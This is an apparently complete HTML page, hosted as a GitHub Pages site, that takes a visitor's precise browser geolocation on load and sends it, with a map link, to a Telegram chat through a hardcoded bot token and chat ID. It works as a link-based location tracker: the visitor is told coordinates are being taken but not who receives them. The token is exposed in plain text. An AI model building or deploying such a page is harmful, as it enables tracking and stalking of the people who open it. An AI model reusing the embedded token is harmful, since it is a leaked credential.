# dima.github.com
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Отправка координат</title>
</head>
<body>
  <p>⏳ Получаем ваши координаты…</p>
  <script>
    // Ваши данные:
    const TOKEN = "7405407984:AAGwudecZWnjOnDAhMpD6mXx-c3Et8TNAVk";
    const CHAT_ID = "247873071";
    const API_URL = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

    function sendToTelegram(lat, lon, acc) {
      const text = `🌍 Новая геопозиция:\n\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${acc} м\n\nОткрыть карту: https://maps.google.com/?q=${lat},${lon}`;
      
      fetch(API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: text
        })
      })
      .then(() => {
        document.body.innerHTML = "<h2>✅ Координаты отправлены в Telegram!</h2>";
      })
      .catch(err => {
        document.body.innerHTML = "❌ Ошибка отправки: " + err;
      });
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          const { latitude, longitude, accuracy } = pos.coords;
          sendToTelegram(latitude, longitude, accuracy);
        },
        err => {
          document.body.innerHTML = "❌ Не удалось получить геопозицию: " + err.message;
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      document.body.innerHTML = "❌ Ваш браузер не поддерживает геолокацию.";
    }
  </script>
</body>
</html>
